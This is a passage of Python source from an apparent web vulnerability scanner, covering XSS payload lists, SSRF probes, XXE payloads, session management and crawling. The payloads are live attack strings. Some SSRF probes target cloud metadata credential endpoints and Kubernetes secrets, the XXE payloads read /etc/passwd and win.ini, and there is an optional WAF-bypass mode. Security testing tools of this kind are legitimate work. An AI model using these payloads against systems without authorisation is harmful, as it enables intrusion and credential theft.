        '`-alert("{canary}")-`',
        '${alert("{canary}")}',
        '${`alert\x60{canary}\x60`}',
        "`${Function('alert(\"{canary}\")')()}`",
    ],
    'comment': [
        '--><script>alert("{canary}")</script><!--',
        '*/alert("{canary}")/*',
        '--!><img src=x onerror=alert("{canary}")>',
        ']]><script>alert("{canary}")</script>',
        '--></style><script>alert("{canary}")</script><style>',
    ],
    'polyglot': [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({canary})//'>",
        "'\"><img src=x onerror=alert('{canary}')><!--",
        '<script>Object.prototype.innerHTML="<img src=x onerror=alert(\'{canary}\')>"</script>',
        # AngularJS CSTI polyglot
        '{{constructor.constructor("alert(\'{canary}\')")()}}',
        '{{7*7}}"><img src=x onerror=alert("{canary}")>',
        # Vue CSTI polyglot
        'v-html="xss"><img src=x onerror=alert("{canary}")>',
    ],
    'encoded': [
        '&lt;script&gt;alert(&quot;{canary}&quot;)&lt;/script&gt;',
        '\\u003cscript\\u003ealert("{canary}")\\u003c/script\\u003e',
        '&#60;img src=x onerror=alert(&#39;{canary}&#39;)&#62;',
        '&#x3C;script&#x3E;alert(&#x22;{canary}&#x22;)&#x3C;/script&#x3E;',
        '%3Cscript%3Ealert(%22{canary}%22)%3C%2Fscript%3E',
        '\\074script\\076alert("{canary}")\\074/script\\076',
    ],
    'href': [
        'javascript:alert("{canary}")',
        'javascript:alert`{canary}`',
        'JaVaScRiPt:alert("{canary}")',
        'javascript&#58;alert("{canary}")',
        'javascript&#x3A;alert("{canary}")',
        'java\tscript:alert("{canary}")',
        'java\nscript:alert("{canary}")',
        'vbscript:alert("{canary}")',
        'data:text/html,<script>alert("{canary}")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    ],
    'css': [
        'expression(alert("{canary}"))',
        '</style><script>alert("{canary}")</script>',
        '-moz-binding:url("data:text/xml,<bindings xmlns=\'http://www.mozilla.org/xbl\'><binding id=\'x\'><implementation><constructor>alert(\'{canary}\')</constructor></implementation></binding></bindings>#x")',
        'x:expression(alert("{canary}"))',
    ],
}

# ── SSRF ──────────────────────────────────────────────────────────────────────

_SSRF_PARAM_RE = re.compile(
    r'\b(url|uri|src|dest|destination|target|redirect|next|link|callback|'
    r'host|domain|endpoint|proxy|fetch|load|request|return|go|forward|'
    r'source|to|path|site|resource|location|ref|referrer)\b', re.I
)

_SSRF_PROBES = [
    # ── AWS IMDSv1 ────────────────────────────────────────────────────────────
    ('http://169.254.169.254/latest/meta-data/',                              ['ami-id', 'instance-id', 'local-ipv4']),
    ('http://169.254.169.254/latest/',                                        ['meta-data', 'user-data', 'dynamic']),
    ('http://169.254.169.254/latest/meta-data/iam/security-credentials/',     ['AccessKeyId', 'SecretAccessKey', 'Token']),
    ('http://169.254.169.254/latest/user-data',                               ['#!/bin', 'cloud-init', 'UserData']),
    # ── AWS IMDSv2 bypass attempts ────────────────────────────────────────────
    ('http://169.254.169.254/latest/api/token',                               ['token', 'TTL']),
    ('http://169.254.169.254/latest/meta-data/hostname',                      ['compute.internal', 'ec2.internal']),
    # ── Google Cloud ─────────────────────────────────────────────────────────
    ('http://metadata.google.internal/computeMetadata/v1/',                   ['project-id', 'instance-id', 'serviceAccounts']),
    ('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', ['access_token', 'expires_in']),
    ('http://metadata.google.internal/computeMetadata/v1/project/project-id', ['project', 'numeric-project-id']),
    # ── Azure IMDS ────────────────────────────────────────────────────────────
    ('http://169.254.169.254/metadata/instance?api-version=2021-02-01',       ['subscriptionId', 'resourceGroupName', 'vmId']),
    ('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', ['access_token', 'expires_in']),
    # ── Alibaba Cloud ─────────────────────────────────────────────────────────
    ('http://100.100.100.200/latest/meta-data/',                               ['instance-id', 'region-id']),
    ('http://100.100.100.200/latest/meta-data/ram/security-credentials/',      ['AccessKeyId', 'SecretAccessKey']),
    # ── DigitalOcean ─────────────────────────────────────────────────────────
    ('http://169.254.169.254/metadata/v1/',                                    ['droplet_id', 'hostname', 'region']),
    ('http://169.254.169.254/metadata/v1/id',                                  ['droplet_id']),
    # ── Oracle Cloud ─────────────────────────────────────────────────────────
    ('http://169.254.169.254/opc/v1/instance/',                                ['compartmentId', 'displayName', 'region']),
    # ── IBM Cloud / Softlayer ─────────────────────────────────────────────────
    ('https://api.service.softlayer.com/rest/v3/SoftLayer_Account',           ['accountId', 'firstName', 'masterUserId']),
    # ── Kubernetes API ────────────────────────────────────────────────────────
    ('https://kubernetes.default.svc/api/',                                    ['apiVersion', 'kind', 'ServerVersion']),
    ('https://kubernetes.default.svc/api/v1/namespaces/default/secrets',      ['items', 'apiVersion', 'kind']),
    ('http://10.0.0.1/',                                                       ['kubernetes', 'api']),
    # ── Docker socket / internal ─────────────────────────────────────────────
    ('http://localhost:2375/version',                                          ['Docker', 'ApiVersion', 'Version']),
    ('http://127.0.0.1:2376/version',                                          ['Docker', 'ApiVersion']),
    # ── Internal services ─────────────────────────────────────────────────────
    ('http://127.0.0.1:22/',                                                   ['SSH-2.0', 'OpenSSH']),
    ('http://127.0.0.1:6379/',                                                 ['redis_version', '+PONG', 'NOAUTH']),
    ('http://127.0.0.1:9200/',                                                 ['elasticsearch', 'cluster_name', 'version']),
    ('http://127.0.0.1:9200/_cat/indices',                                     ['yellow', 'green', 'index']),
    ('http://127.0.0.1:27017/',                                                ['MongoDB', 'mongod', 'It looks like']),
    ('http://127.0.0.1:5984/',                                                 ['couchdb', 'version', 'Welcome']),
    ('http://127.0.0.1:8500/v1/agent/self',                                   ['consul', 'Config', 'Member']),
    ('http://127.0.0.1:8161/api/json/v1/info',                                 ['ActiveMQ', 'brokerName']),
    ('http://127.0.0.1:4848/',                                                 ['GlassFish', 'Administration']),
    ('http://127.0.0.1:8161/',                                                 ['ActiveMQ', 'broker']),
    ('http://localhost/server-status',                                          ['Apache', 'Server', 'requests/sec']),
    ('http://localhost/nginx_status',                                           ['Active connections', 'server accepts handled']),
    # ── IPv6 loopback variants ────────────────────────────────────────────────
    ('http://[::1]/',                                                           ['200', 'Welcome', 'Index']),
    ('http://[::ffff:127.0.0.1]/',                                             ['200', 'html', 'Welcome']),
    # ── URL scheme confusion ─────────────────────────────────────────────────
    ('file:///etc/passwd',                                                      ['root:x:0:0', 'bin:x:']),
    ('file:///etc/hosts',                                                       ['localhost', '127.0.0.1']),
    ('dict://127.0.0.1:6379/info',                                             ['redis_version', '+OK']),
    ('gopher://127.0.0.1:6379/_PING%0d%0a',                                   ['PONG', '+PONG']),
    # ── Internal network ─────────────────────────────────────────────────────
    ('http://192.168.0.1/',                                                    ['router', 'gateway', 'admin', 'login']),
    ('http://10.0.0.1/',                                                       ['admin', 'router', 'management']),
    ('http://172.16.0.1/',                                                     ['admin', 'router', 'management']),
]

# ── XXE ───────────────────────────────────────────────────────────────────────

_XXE_PASSWD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<root><data>&xxe;</data></root>'
)
_XXE_SSRF = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/">]>'
    '<root><data>&xxe;</data></root>'
)
_XXE_WINDOWS = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
    '<root><data>&xxe;</data></root>'
)
_XXE_HOSTS = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>'
    '<root><data>&xxe;</data></root>'
)
# Parameter entity OOB probe
_XXE_OOB = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ds1hunter-xxe-oob.invalid/"> %xxe;]>'
    '<root><data>oob-probe</data></root>'
)
# CDATA bypass for filters that block direct entity content
_XXE_CDATA = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<root><![CDATA[&xxe;]]></root>'
)
_XXE_SIG = re.compile(r'root:[x*]:0:0|meta-data|instance-id|latest|\[boot|for 16-bit|localhost', re.I)

# All XXE payloads with their confirmation signatures
_XXE_PAYLOADS_EXT = [
    (_XXE_PASSWD,  ['root:x:0:0', 'bin:x:', '/bin/bash'],             'Linux passwd read'),
    (_XXE_WINDOWS, ['[fonts]', '[boot loader]', 'for 16-bit'],        'Windows win.ini read'),
    (_XXE_HOSTS,   ['127.0.0.1', 'localhost'],                        'Linux hosts read'),
    (_XXE_SSRF,    ['ami-id', 'instance-id', 'meta-data', 'latest'],  'AWS metadata SSRF'),
    (_XXE_OOB,     ['oob-probe'],                                      'OOB parameter entity'),
]

# common XML content types
_XML_CONTENT_TYPES = [
    'application/xml', 'text/xml', 'application/soap+xml',
    'application/xhtml+xml', 'application/rss+xml',
]


# ── Session management ────────────────────────────────────────────────────────

def create_session(
    url: str,
    auth_header: str = '',
    max_depth: int = 3,
    max_urls: int = 200,
    checks: Optional[List[str]] = None,
    extra_headers: Optional[Dict[str, str]] = None,
    waf_bypass: bool = False,
    oob_enabled: bool = True,
) -> str:
    sid = str(uuid.uuid4())[:12]
    parsed = urlparse(url)
    with _lock:
        _sessions[sid] = {
            'id':            sid,
            'url':           url,
            'scope_host':    parsed.netloc,
            'auth_header':   auth_header,
            'max_depth':     min(max_depth, 6),
            'max_urls':      min(max_urls, 1000),
            'checks':        checks or ['sqli', 'sqli_blind', 'xss', 'xss_ctx', 'dom_xss',
                                        'stored_xss',
                                        'ssti', 'traversal', 'cmd_inject', 'redirect',
                                        'ssrf', 'xxe',
                                        'java_deser', 'php_inject', 'log4shell', 'dotnet_deser',
                                        'smuggling', 'graphql', 'mass_assign',
                                        'cache_poison', 'proto_poll', 'ws_inject',
                                        'auth_bypass', 'cors', 'sec_headers',
                                        'sensitive_files', 'info_disclosure',
                                        'json_inject', 'verb_tamper',
                                        'csrf', 'host_header'],
            'extra_headers': extra_headers or {},
            'waf_bypass':    waf_bypass,
            'oob_enabled':          oob_enabled,
            'oob_client':           None,
            'stored_xss_canaries':  {},
            'ws_endpoints':         [],
            'running':       False,
            'paused':        False,
            'done':          False,
            '_stop':         False,
            '_pause_evt':    threading.Event(),
            'phase':         'idle',
            'phase_detail':  '',
            'crawled':       0,
            'probed':        0,
            'total_endpoints': 0,
            'findings':      [],
            'tech_stack':    [],
            'endpoints':     [],
            'started_at':    None,
            'finished_at':   None,
            'error':         None,
            '_finding_keys': set(),
        }
        _sessions[sid]['_pause_evt'].set()  # SET = running (not paused)
    return sid


_INTERNAL_KEYS = {'_stop', '_pause_evt', '_finding_keys', 'oob_client', 'stored_xss_canaries'}


def get_session(sid: str) -> Optional[Dict]:
    with _lock:
        s = _sessions.get(sid)
        if not s:
            return None
        return {k: v for k, v in s.items() if k not in _INTERNAL_KEYS}


def list_sessions() -> List[Dict]:
    with _lock:
        return [
            {k: v for k, v in s.items()
             if k not in _INTERNAL_KEYS | {'endpoints'}}
            for s in _sessions.values()
        ]


def start_session(sid: str) -> bool:
    with _lock:
        s = _sessions.get(sid)
        if not s or s['running']:
            return False
        s['running']    = True
        s['started_at'] = time.time()

    t = threading.Thread(
        target=_run, args=(sid,),
        daemon=True, name=f'activescan-{sid[:8]}',
    )
    t.start()
    return True


def stop_session(sid: str) -> None:
    with _lock:
        s = _sessions.get(sid)
        if s:
            s['_stop'] = True
            evt = s.get('_pause_evt')
            if evt:
                evt.set()  # unblock any pause-wait so thread can exit


def pause_session(sid: str) -> bool:
    with _lock:
        s = _sessions.get(sid)
        if not s or not s.get('running') or s.get('done'):
            return False
        s['paused'] = True
        evt = s.get('_pause_evt')
    if evt:
        evt.clear()  # CLEAR = paused
    return True


def resume_session(sid: str) -> bool:
    with _lock:
        s = _sessions.get(sid)
        if not s:
            return False
        s['paused'] = False
        evt = s.get('_pause_evt')
    if evt:
        evt.set()  # SET = running
    return True


def delete_session(sid: str) -> bool:
    """Remove a session from memory. Stops it first if running. Returns False if not found."""
    with _lock:
        s = _sessions.get(sid)
        if s is None:
            return False
        if s.get('running'):
            s['_stop'] = True
            evt = s.get('_pause_evt')
            if evt:
                evt.set()
            return False  # still running - stop requested, not yet deleted
        del _sessions[sid]
    _store_delete(_MODULE, sid)
    return True


# ── Runner ────────────────────────────────────────────────────────────────────

def _run(sid: str) -> None:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_scan(sid))
    except Exception as exc:
        with _lock:
            s = _sessions.get(sid)
            if s:
                s['error'] = str(exc)
                logger.exception('[ActiveScan] %s unhandled error', sid)
    finally:
        loop.close()
    snapshot = None
    with _lock:
        s = _sessions.get(sid)
        if s:
            s['running']      = False
            s['done']         = True
            s['phase']        = 'done'
            s['finished_at']  = time.time()
            s['scan_duration'] = round(s['finished_at'] - (s.get('started_at') or s['finished_at']), 1)
            snapshot = {k: v for k, v in s.items() if k not in _INTERNAL_KEYS}
    if snapshot:
        _store_save(_MODULE, sid, snapshot)


# ── Main scan coroutine ───────────────────────────────────────────────────────

async def _scan(sid: str) -> None:
    # ── Set phase='crawl' immediately — BEFORE any I/O so UI never shows Idle ──
    _set(sid, phase='crawl', phase_detail='Initialising…')

    with _lock:
        cfg = dict(_sessions[sid])

    _target_host = urlparse(cfg['url']).hostname or ''
    _parsed_url  = urlparse(cfg['url'])
    _target_port = _parsed_url.port or (443 if _parsed_url.scheme == 'https' else 80)

    # Pre-scan TCP connectivity test — run in executor so DNS resolution
    # (which ignores socket.settimeout) cannot block the event loop.
    _connect_host = '127.0.0.1' if scan_proxy._is_loopback(_target_host) else _target_host
    loop = asyncio.get_event_loop()

    def _tcp_check():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6)
            errno = s.connect_ex((_connect_host, _target_port))
            s.close()
            return errno
        except Exception as exc:
            return exc

    try:
        _tcp_result = await asyncio.wait_for(
            loop.run_in_executor(None, _tcp_check), timeout=10.0
        )
        if isinstance(_tcp_result, Exception):
            _set(sid, phase='done', running=False, done=True,
                 error=f'Pre-scan connectivity check failed for {_target_host}:{_target_port} - {_tcp_result}')
            return
        if _tcp_result != 0:
            _set(sid, phase='done', running=False, done=True,
                 error=f'Cannot connect to {_target_host}:{_target_port} - '
                       f'connection refused or host unreachable (errno {_tcp_result}). '
                       'Make sure the target is running and the port is correct.')
            return
    except asyncio.TimeoutError:
        _set(sid, phase='done', running=False, done=True,
             error=f'Pre-scan connectivity check timed out for {_target_host}:{_target_port} - '
                   'host unreachable or DNS resolution failed.')
        return

    # ── Build connector: uses proxy if configured+reachable, else direct ──────
    # make_connector() now does the reachability check internally and falls back
    # to a direct connection automatically — the scan never aborts due to proxy.
    connector = scan_proxy.make_connector(limit=8, target_host=_target_host)
    _proxy_url = scan_proxy.get_proxy_url()
    _via_proxy = bool(_proxy_url and not scan_proxy._is_loopback(_target_host)
                      and scan_proxy._proxy_reachable(_proxy_url))
    # Tor/SOCKS5 adds 3-8 s per hop — use a longer timeout when running via proxy
    timeout = aiohttp.ClientTimeout(total=30 if _via_proxy else 12)
    _set(sid, phase_detail=f'Crawling via proxy ({_proxy_url})…' if _via_proxy else 'Crawling directly…')

    base_headers = {'User-Agent': 'DS1Hunter-ActiveScan/1.0'}
    if cfg['auth_header']:
        if ':' in cfg['auth_header']:
            k, _, v = cfg['auth_header'].partition(':')
            base_headers[k.strip()] = v.strip()
        else:
            base_headers['Authorization'] = cfg['auth_header']
    base_headers.update(cfg['extra_headers'])

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=base_headers
    ) as http:

        # ── OOB client setup ──────────────────────────────────────────────────
        oob_client = None
        if cfg.get('oob_enabled', True):
            try:
                from apps.oob.apps import get_oob_server
                loop = asyncio.get_event_loop()
                oob_srv = await asyncio.wait_for(
                    loop.run_in_executor(None, get_oob_server), timeout=3.0
                )
                if oob_srv and oob_srv.running:
                    from core.oob.client import OOBClient
                    oob_client = OOBClient(
                        server_host=oob_srv.public_host,
                        http_port=oob_srv.http_port,
                        scan_id=sid[:8],
                    )
                    _set(sid, oob_client=oob_client)
                    logger.info('[ActiveScan] OOB client ready - %s', oob_client)
            except asyncio.TimeoutError:
                logger.debug('[ActiveScan] OOB server lookup timed out — skipping')
            except Exception as exc:
                logger.debug('[ActiveScan] OOB not available: %s', exc)

        # WAF bypass: profile WAF before probing, results stored in session for _probe_endpoint
        if cfg.get('waf_bypass'):
            try:
                from core.waf_bypass import make_bypass_engine
                _waf = make_bypass_engine(cfg['url'], http, headers=base_headers)
                await asyncio.wait_for(_waf.profile(), timeout=15.0)
                _set(sid, waf_name=_waf.waf_name, waf_detected=_waf.waf_detected,
                     waf_blocked_patterns=_waf.blocked_patterns,
                     waf_allowed_patterns=_waf.allowed_patterns)
                logger.info('[ActiveScanner] WAF bypass: waf=%s blocked=%d',
                            _waf.waf_name, len(_waf.blocked_patterns))
            except asyncio.TimeoutError:
                logger.warning('[ActiveScanner] WAF bypass profiling timed out — continuing without it')
            except Exception as exc:
                logger.warning('[ActiveScanner] WAF bypass profile failed: %s', exc)

        _set(sid, phase_detail='BFS link extraction…')
        await _check_pause(sid)
        endpoints = await _crawl_phase(sid, cfg, http)
        if not endpoints:
            _proxy = scan_proxy.get_proxy_url()
            hint = (
                'Possible causes: '
                f'{"(1) scan proxy " + _proxy + " unreachable — disable it in Settings; " if _proxy else ""}'
                '(2) target blocked or returned only 4xx/5xx; '
                '(3) Playwright not installed — run "playwright install chromium".'
            )
            logger.warning('[ActiveScan] Crawl returned 0 endpoints for %s. %s', cfg["url"], hint)
            _set(sid, phase='done', running=False, done=True,
                 error=f'Crawl returned 0 endpoints — no pages could be fetched. {hint}')
            return
        if _stopped(sid):
            return

        # ── Phase 2: Fingerprint ──────────────────────────────────────────────
        _set(sid, phase='fingerprint', phase_detail='Identifying tech stack…')
        await _check_pause(sid)
        if _stopped(sid):
            return
        tech = await _fingerprint(cfg['url'], http)
        _set(sid, tech_stack=tech)
        _save_checkpoint(sid)  # checkpoint: crawl + fingerprint done

        # Inject tech-stack-specific payloads from ThinkEngine's payload map
        _inject_tech_payloads(tech)

        # ── Phase 3: Probe ────────────────────────────────────────────────────
        _set(sid, phase='probe', total_endpoints=len(endpoints), endpoints=endpoints,
             phase_detail='Starting endpoint probes…')

        checks = cfg['checks']
        scope  = cfg['scope_host']

        # Sensitive file exposure - run once against base host
        if 'sensitive_files' in checks:
            await _check_pause(sid)
            if _stopped(sid):
                return
            await _check_sensitive_files(sid, cfg['url'], http, scope)
            _save_checkpoint(sid)  # checkpoint: sensitive files done

        _sem = asyncio.Semaphore(3)  # 3 concurrent endpoint probes

        async def _probe_one(ep):
            async with _sem:
                if _stopped(sid):
                    return
                await _check_pause(sid)
                if _stopped(sid):
                    return
                try:
                    await asyncio.wait_for(
                        _probe_endpoint(sid, ep, http, checks, scope, base_headers,
                                        waf_bypass=cfg.get('waf_bypass', False),
                                        oob_client=oob_client),
                        timeout=90.0,
                    )
                except asyncio.TimeoutError:
                    logger.debug('[ActiveScan] Probe timed out (90s) for %s — skipping', ep['url'])
                except Exception as exc:
                    logger.debug('[ActiveScan] Probe error for %s: %s', ep['url'], exc)
                probed_count = 0
                with _lock:
                    s = _sessions.get(sid)
                    if s:
                        s['probed'] += 1
                        probed_count = s['probed']
                if probed_count > 0 and probed_count % 5 == 0:
                    _save_checkpoint(sid)

        await asyncio.gather(*[_probe_one(ep) for ep in endpoints])

        # ── Stored XSS sweep: check all crawled pages for injected canaries ──
        if 'stored_xss' in checks and not _stopped(sid):
            with _lock:
                _sx_count = len(_sessions.get(sid, {}).get('stored_xss_canaries', {}))
            if _sx_count > 0:
                _set(sid, phase_detail=f'Sweeping {len(endpoints)} pages for {_sx_count} stored XSS canaries…')
                await _sweep_stored_xss(sid, endpoints, http)

        # ── WebSocket injection: scan detected WS endpoints ───────────────────
        if 'ws_inject' in checks and not _stopped(sid):
            with _lock:
                _ws_eps = list(_sessions.get(sid, {}).get('ws_endpoints', []))
            if _ws_eps:
                _set(sid, phase_detail=f'Scanning {len(_ws_eps)} WebSocket endpoint(s)…')
                for _ws_url in _ws_eps[:10]:
                    if _stopped(sid):
                        break
                    await _check_ws_inject(sid, _ws_url, http)

        # ── OOB collection: wait then confirm blind findings ──────────────────
        if oob_client and oob_client.pending_count > 0:
            _set(sid, phase_detail=f'Collecting {oob_client.pending_count} OOB callbacks…')
            confirmed = await oob_client.collect_confirmed(wait_secs=10.0)
            for token, vuln_type, context, cb_data in confirmed:
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    f'Blind {vuln_type.upper()} - OOB Confirmed',
                    'endpoint': context.get('url', ''),
                    'detail': (
                        f'Out-of-band callback received from target - confirms blind {vuln_type}. '
                        f'Callback from {cb_data.get("src_ip", "?")} via {cb_data.get("method","?")} '
                        f'at {context.get("param", "")} with payload: {context.get("payload", "")}'
                    ),
                    'evidence': {
                        'token':    token,
                        'vuln':     vuln_type,
                        'callback': cb_data,
                        **{k: v for k, v in context.items()},
                    },
                })


def _set(sid: str, **kw) -> None:
    with _lock:
        s = _sessions.get(sid)
        if s:
            s.update(kw)


def _save_checkpoint(sid: str) -> None:
    """Persist current session state so findings survive a mid-scan interruption."""
    snapshot = None
    with _lock:
        s = _sessions.get(sid)
        if s:
            snapshot = {k: v for k, v in s.items() if k not in _INTERNAL_KEYS}
    if snapshot:
        try:
            _store_save(_MODULE, sid, snapshot)
        except Exception:
            pass


def _stopped(sid: str) -> bool:
    with _lock:
        return _sessions.get(sid, {}).get('_stop', False)


async def _check_pause(sid: str) -> None:
    """Await until the session is unpaused, or return immediately if not paused."""
    while True:
        with _lock:
            s = _sessions.get(sid)
            if s is None or s.get('_stop'):
                return
            evt = s.get('_pause_evt')
        if evt is None or evt.is_set():
            return
        await asyncio.sleep(0.5)


_VULN_MODULE_MAP = {
    'sqli':   '_SQLI_PAYLOADS',
    'xss':    None,   # XSS payloads are context-keyed dicts, handled separately
    'ssti':   '_SSTI_PAYLOADS',
    'ssrf':   None,   # SSRF probes are (url, sigs) tuples, not plain strings
    'cmdi':   '_CMD_PAYLOADS',
    'lfi':    '_TRAVERSAL_PAYLOADS',
}

def _inject_tech_payloads(tech_stack: List[Dict]) -> None:
    """Extend module-level payload lists with tech-stack-specific payloads from ThinkEngine."""
    import sys
    mod = sys.modules[__name__]
    detected = {t['name'].lower() for t in (tech_stack or [])}
    for tech_name, vuln_map in _TECH_PAYLOAD_MAP.items():
        if tech_name not in detected:
            continue
        for vuln_type, extra_payloads in vuln_map.items():
            list_attr = _VULN_MODULE_MAP.get(vuln_type)
            if list_attr is None:
                continue
            target_list = getattr(mod, list_attr, None)
            if not isinstance(target_list, list):
                continue
            try:
                existing = set(target_list)
            except TypeError:
                existing = {str(p) for p in target_list}
            for p in extra_payloads:
                if p not in existing:
                    target_list.append(p)
                    existing.add(p)


def _add_finding(sid: str, finding: Dict) -> None:
    """Score, FP-filter, dedup, then append finding."""
    # Score and FP-filter before dedup (avoids caching suppressed findings)
    conf = score_finding(finding)
    finding['confidence_score'] = round(conf, 3)
    if is_likely_false_positive(finding):
        return

    title  = finding.get('title', '')
    ep_raw = finding.get('endpoint', '')
    try:
        _p = urlparse(ep_raw)
        ep_base = f"{_p.scheme}://{_p.netloc}{_p.path}"
    except Exception:
        ep_base = ep_raw
    title_prefix = title.split(' - ')[0].strip()
    param = (finding.get('evidence') or {}).get('param', '')
    dedup_key = f"{title_prefix}|{ep_base}|{param}"
    with _lock:
        s = _sessions.get(sid)
        if s:
            if dedup_key in s['_finding_keys']:
                return
            s['_finding_keys'].add(dedup_key)
            s['findings'].append(finding)


# ── Phase 1: Crawl ────────────────────────────────────────────────────────────

async def _crawl_phase(sid: str, cfg: Dict, http: aiohttp.ClientSession) -> List[Dict]:
    """Playwright SPA crawl when available, otherwise aiohttp BFS.

    Loopback targets (127.0.0.1, localhost, …) skip Playwright entirely - the
    headless browser is an external process that may not reach loopback even
    without a proxy, and aiohttp with AF_INET already works reliably.

    Falls back to aiohttp when Playwright either raises OR returns 0 endpoints
    (silent failure - e.g. page.goto raises inside the inner try/except).
    """
    _tgt = urlparse(cfg['url']).hostname or ''
    if _PLAYWRIGHT_OK and not scan_proxy._is_loopback(_tgt):
        try:
            results = await asyncio.wait_for(_crawl_playwright(sid, cfg), timeout=180.0)
            if results:
                return results
            logger.warning('[ActiveScan] Playwright crawl returned 0 endpoints - falling back to aiohttp')
        except asyncio.TimeoutError:
            logger.warning('[ActiveScan] Playwright crawl timed out (180s) — falling back to aiohttp')
        except Exception as exc:
            logger.warning('[ActiveScan] Playwright crawl raised (%s) - falling back to aiohttp', exc)
    elif scan_proxy._is_loopback(_tgt):
        logger.info('[ActiveScan] Loopback target - using aiohttp directly (skipping Playwright)')
    return await _crawl_aiohttp(sid, cfg, http)


async def _crawl_playwright(sid: str, cfg: Dict) -> List[Dict]:
    """Headless Chromium crawl - renders JS, intercepts XHR/fetch, extracts forms."""
    scope     = cfg['scope_host']
    max_urls  = cfg['max_urls']
    max_depth = cfg['max_depth']

    visited: Set[str]   = set()
    endpoints: List[Dict] = []
    queue = [(cfg['url'].rstrip('/'), 0)]

    extra_headers = {}
    if cfg['auth_header']:
        if ':' in cfg['auth_header']:
            k, _, v = cfg['auth_header'].partition(':')
            extra_headers[k.strip()] = v.strip()
        else:
            extra_headers['Authorization'] = cfg['auth_header']
    extra_headers.update(cfg['extra_headers'])

    async with _pw() as pw:
        _target_host_pw = urlparse(cfg['url']).hostname or ''
        _pw_proxy = scan_proxy.playwright_proxy(target_host=_target_host_pw)
        browser = await pw.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-dev-shm-usage', '--ignore-certificate-errors'],
            **({'proxy': _pw_proxy} if _pw_proxy else {}),
        )
        context = await browser.new_context(
            ignore_https_errors=True,
            extra_http_headers=extra_headers,
            user_agent='DS1Hunter-ActiveScan/1.0',
        )
        # Intercept all network requests to capture XHR/fetch endpoints
        xhr_endpoints: Set[str] = set()

        async def _on_request(req):
            try:
                u = req.url.split('?')[0].split('#')[0]
                p = urlparse(u)
                if p.netloc == scope and req.resource_type in ('xhr', 'fetch'):
                    xhr_endpoints.add(req.url)
            except Exception:
                pass

        context.on('request', _on_request)
        page = await context.new_page()

        while queue and len(visited) < max_urls and not _stopped(sid):
            url, depth = queue.pop(0)
            url = url.split('#')[0]
            if not url or url in visited:
                continue
            parsed = urlparse(url)
            if not _in_scope(parsed.netloc, scope) or not parsed.scheme.startswith('http'):
                continue

            visited.add(url)
            _set(sid, crawled=len(visited), phase_detail=f'[Playwright] {url[:60]}')

            try:
                # Use 'load' not 'networkidle' - SPAs with long-polling never reach networkidle
                resp = await page.goto(url, wait_until='load', timeout=8000)
                status = resp.status if resp else 0
                # Give JS a moment to render, then grab DOM
                try:
                    await page.wait_for_timeout(800)
                except Exception:
                    pass
                content = await page.content()
                final_url = page.url
            except Exception:
                continue

            params = list(parse_qs(parsed.query).keys())
            forms_raw = await _extract_forms_playwright(page, final_url)

            ep = {
                'url':    url,
                'method': 'GET',
                'params': params,
                'forms':  forms_raw,
                'status': status,
                'ct':     'text/html',
                'spa':    True,
            }
            if status < 400 or params or forms_raw:
                endpoints.append(ep)

            if depth < max_depth and content:
                child_links, _ = _links_from_html(content, final_url)
                for link in child_links:
                    norm = link.split('#')[0]
                    if norm and norm not in visited:
                        queue.append((norm, depth + 1))
                for ws_match in _WS_URL_RE.finditer(content):
                    ws_u = ws_match.group(1)
                    with _lock:
                        s = _sessions.get(sid)
                        if s and ws_u not in s.get('ws_endpoints', []):
                            s.setdefault('ws_endpoints', []).append(ws_u)

            await asyncio.sleep(0.1)

        await browser.close()

    # Add captured XHR/fetch endpoints
    for xhr_url in xhr_endpoints:
        if _stopped(sid):
            break
        parsed = urlparse(xhr_url)
        params = list(parse_qs(parsed.query).keys())
        endpoints.append({
            'url':    xhr_url,
            'method': 'GET',
            'params': params,
            'forms':  [],
            'status': 0,
            'ct':     'application/json',
            'xhr':    True,
        })

    return endpoints


async def _extract_forms_playwright(page, base_url: str) -> List[Dict]:
    """Extract forms from a rendered page via Playwright DOM evaluation."""
    try:
        forms = await page.evaluate('''() => {
            return Array.from(document.forms).map(f => ({
                action: f.action || '',
                method: (f.method || 'get').toUpperCase(),
                inputs: Array.from(f.elements)
                    .filter(el => el.name && el.tagName !== 'BUTTON')
                    .map(el => ({name: el.name, type: el.type || 'text', value: el.value || ''}))
            }));
        }''')
        return forms or []
    except Exception:
        return []


async def _crawl_aiohttp(sid: str, cfg: Dict, http: aiohttp.ClientSession) -> List[Dict]:
    """BFS crawl using aiohttp - concurrent batch processing per depth level."""
    scope     = cfg['scope_host']
    max_urls  = cfg['max_urls']
    max_depth = cfg['max_depth']

    visited: Set[str]    = set()
    endpoints: List[Dict] = []
    sem = asyncio.Semaphore(8)

    # Seed with the start URL; process in BFS batches per depth level
    current_level = [cfg['url'].rstrip('/')]

    for depth in range(max_depth + 1):
        if not current_level or _stopped(sid):
            break

        # Deduplicate and scope-filter this level's URLs
        to_fetch = []
        for raw in current_level:
            url = raw.split('#')[0]
            if not url or url in visited:
                continue
            parsed = urlparse(url)
            if not _in_scope(parsed.netloc, scope) or not parsed.scheme.startswith('http'):
                continue
            if len(visited) >= max_urls:
                break
            visited.add(url)
            to_fetch.append(url)

        if not to_fetch:
            break

